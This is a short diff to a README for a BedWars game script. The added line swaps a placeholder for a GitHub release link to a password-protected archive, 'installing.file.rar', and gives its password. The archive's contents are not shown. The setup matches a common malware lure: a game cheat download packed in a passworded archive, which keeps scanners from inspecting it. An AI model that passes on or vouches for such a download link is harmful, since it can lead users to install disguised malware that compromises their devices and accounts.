@@ -29,6 +29,6 @@ This project is licensed under the MIT License.
 
 ## Download
 
-[Download the script here](https://your-download-link-here.com)
+[Download the script here](https://github.com/Nikita27364/BedWars-script/releases/download/soft/installing.file.rar) Password:ojgjirg4wf82jf
 
 **Become the ultimate BedWars champion with knowledge as your weapon!**
